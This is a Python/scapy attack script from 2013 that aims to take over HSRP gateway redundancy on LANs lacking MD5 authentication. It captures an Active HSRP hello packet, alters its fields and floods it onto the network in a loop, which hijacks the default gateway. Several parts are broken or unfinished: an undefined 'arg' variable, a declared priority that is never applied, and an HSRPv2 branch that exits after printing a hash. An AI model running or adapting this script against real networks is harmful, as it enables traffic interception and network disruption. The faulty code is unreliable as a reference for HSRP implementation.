#!/usr/bin/env python

# $Id: 20130302$
# $Date: 2013-03-02 08:41:59$
# $Author: Marek Lukaszuk$

# This takes over any HSRPv0/1 and v2
# communication in LAN that
# is _not_ protected by MD5 auth

# http://www.networksorcery.com/enp/protocol/hsrp.htm
# http://www.cisco.com/en/US/docs/ios/12_3t/12_3t2/feature/guide/gthsrpau.html
# MD5 auth calculation is done based on:
# http://tools.ietf.org/html/rfc1828

from scapy.all import *
import time
import sys
import hashlib

# tweak variables
IPv4Src = "10.0.0.10"
IPv6Src = "2001::ff"
EthSrc = "00:aa:bb:cc:dd:ee"
interface = "tap0"
HSRPpri = 255
HSRPHelloTime = 1
MD5Secret = "pass"

# scapy verbose toggle
conf.verb = arg.verbose

hsrpv2 = "\x02"
hsrpv2active = "\x06"

##
# padding for the first part of the MD5 auth
##
def padding(msglen):
  chunks = int((msglen+9)/64)
  missing_chunks = 64 - abs((chunks*64)-(msglen+9))

  pad = "\x80"
  for i in xrange(0,missing_chunks):
    pad += "\x00"
  pad += struct.pack('>Q',msglen*8)

  return pad

##
# this function checks if the HSRP packet is an Active packet
##
def hsrpactive(pkt):
  if pkt.haslayer(HSRP):
    if pkt[HSRP].state == 16: # HSRPv0/1
      return True
    if str(pkt[HSRP])[2] == hsrpv2 and str(pkt[HSRP])[4] == hsrpv2active: # HSRPv2
      return True
  return False


# lets capture one Active HSRP status packet
#p = rdpcap("hsrp_old.pcap")[0]
#p = rdpcap("hsrpv1_auth_pass.pcap")[0]
p = sniff(iface = interface, count = 1, filter = "udp and port 1985", lfilter = lambda x: hsrpactive(x))[0]

#wrpcap("hsrp_old.pcap",p)
# now lets modify it
p[Ether].src = None

# set checksums to None to
# recalculate them automatically
if p.haslayer(IP):
  p[IP].chksum = None
  #p[IP].len = None
#  p[IP].src = IPv4Src
elif p.haslayer(IPv6): # TODO - test IPv6
  p[IPv6].chksum = None
  #p[IPv6].src = IPv6Src

#p[UDP].len = None
p[UDP].chksum = None

data = str(p[HSRP])
# lets increase priority
if str(p[HSRP])[2] == hsrpv2 and str(p[HSRP])[4] == hsrpv2active:
  off = 0
  while True:

    if off >= len(data):
      break

#    if data[off] == "\x01": # HSRPv2 TLV for group TODO
#       data = data[:off+16] + chr(HSRPpri) + data[off+17:]

    if data[off] == "\x04":
      print "org: "+str(p[IP]).encode('hex')
      print "co : "+str(data[-16:]).encode('hex')

      p[IP].ttl = 0
      p[IP].tos = 0
      p[IP].chksum = 0
      p[UDP].chksum = 0

      data = data[:-16]+(chr(0)*16)
      p[UDP].payload = data.decode('string_escape')

      key = chr(0)+MD5Secret
      print "cn : "+hashlib.md5(key+padding(len(key))+str(p[IP])+key).hexdigest()
      sys.exit()

    off += ord(data[off+1]) + 2

else:
  if len(p[HSRP]) > 28: # HSRPv0/1 Auth - TODO
    pass

p[IP].tos = 0xF
p[IP].ttl = 25

# and lets flood the LAN
while True:
  sendp(p, iface = interface)
  sys.stdout.write(".")
  sys.stdout.flush()
  time.sleep(HSRPHelloTime)

